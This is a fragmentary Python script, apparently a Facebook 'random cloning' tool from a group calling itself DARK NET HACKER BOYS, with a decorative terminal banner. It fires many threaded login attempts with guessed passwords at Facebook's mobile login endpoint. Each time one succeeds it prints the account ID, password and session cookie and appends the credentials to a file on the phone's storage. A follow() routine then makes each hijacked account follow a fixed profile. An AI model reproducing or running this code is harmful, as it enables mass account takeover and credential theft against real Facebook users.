...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=61556258026300', {
...
(_))|___|((_)___|((_)___((_)_  ((_)_ ((_|_))   
 ...
 \033[1;93m|     \033[1;96m[✓] CREATED BY\33[0;m   :  \033[1;96mALEX ADOR           \033[1;93m|
 \033[1;93m|     \033[1;32m[✓] FACEBOK      : \033[1;34mALEX ADOR \033[1;93m|
 \033[1;93m|     \033[1;35m[✓] GITHUB       :  \033[1;35mnethunter999           \033[1;93m|
 \033[1;93m|     \033[1;36m[✓] TOOL STATUS  : \033[1;36m Random Cloning Bd        \033[1;93m|
 \033[1;93m|     \033[1;35m[✓] TEAM         :  \033[1;35mDARK NET HACKER BOYS        \033[1;93m|
 \033[1;93m|     \033[1;36m[✓] TOOL VIRSION :  \033[1;36m0.0                      \033[1;93m|
 \033[1;93m×××××××××××××××××\033[1;93m×××××××××××××××\033[1;93m××××××××××××××××××××
 \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32m PLZ SAPPORT ME BRO....
 \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32mD-N-H-BOYS....
 \033[1;93m××××××××××××××××\033[1;93m×××××××××××××××\033[1;93m××××××××××××××××××""")
def linex():
	print('\033[1;93m ×××××××××××××××××××××××××××××××××××××××××××××××××')
loop = 0
...
def xxr():
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m TOOL OWNER \033[1;97m: \033[1;96mASRAF MAHDI')
...
'cookie': 'datr=FfTmZYNGvKNrM6X9o5kRWLYf',
'cookie': 'sb=FfTmZdqe17HJM304ZPofL3Bl',
'cookie': 'm_pixel_ratio=2',
'cookie': 'wd=360x656',
'cookie': 'ps_l=0',
'cookie': 'ps_n=0',
'cookie': 'fr=0aPmivuBqs9MSE6ag..Bl5vQV..AAA.0.0.Bl5vQs.AWXN9kp85c8'}
            lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r\033[1;32m [D-N-H-BOYS-OK💉] ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie 🍪= \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/D-N-H-BOY-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
